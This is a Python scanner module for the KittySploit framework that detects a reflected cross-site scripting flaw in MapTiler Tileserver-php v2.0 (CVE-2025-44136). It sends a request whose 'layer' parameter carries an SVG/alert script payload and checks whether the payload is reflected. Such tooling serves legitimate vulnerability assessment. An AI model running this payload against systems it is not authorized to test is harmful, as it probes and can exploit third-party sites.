#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""MapTiler Tileserver-php v2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MapTiler Tileserver-php v2.0 - Unauthenticated XSS Detection',
        'description': 'MapTiler Tileserver-php v2.0 contains a reflected XSS caused by unencoded reflection of the GET parameter \\"layer\\" in an error message, letting unauthenticated attackers execute arbitrary script on victim browsers.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'xss', 'maptiler', 'tileserver', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2025-44136', 'https://github.com/mheranco/CVE-2025-44136'],
        'cve': 'CVE-2025-44136',
    }

    def run(self):
        r = self.http_request(method="GET", path='/tileserver.php/wmts/x/1/1/asd?Request=x&layer=%3Csvg+alert(document.domain)%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html',)
        body_all = ('<svg alert(document.domain)>', 'Unknown or not specified dataset',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="MapTiler Tileserver-php v2.0 - Unauthenticated XSS detected",
                path='/tileserver.php/wmts/x/1/1/asd?Request=x&layer=%3Csvg+alert(document.domain)%3E',
            )
            return True
        return False

